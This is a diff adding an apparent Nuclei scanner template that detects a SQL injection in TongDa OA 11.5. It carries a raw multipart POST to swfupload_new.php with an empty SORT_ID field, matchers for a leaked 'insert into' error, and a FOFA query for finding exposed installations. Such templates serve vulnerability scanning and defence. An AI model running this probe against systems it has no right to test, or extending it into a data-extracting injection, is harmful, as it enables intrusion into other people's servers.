@@ -1,0 +1,44 @@
+id: tongda-oa-11-5-sqli
+
+info:
+  name: TongDa OA 11.5 Sqli
+  author: zp857
+  severity: critical
+  tags: tongda-oa,sqli
+  metadata:
+    fofa-query: 'app="通达OA网络智能办公系统"'
+
+requests:
+  - raw:
+      - |
+        POST /general/file_folder/swfupload_new.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+
+        ------------GFioQpMK0vv2--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "SORT_ID"
+          - "insert into"
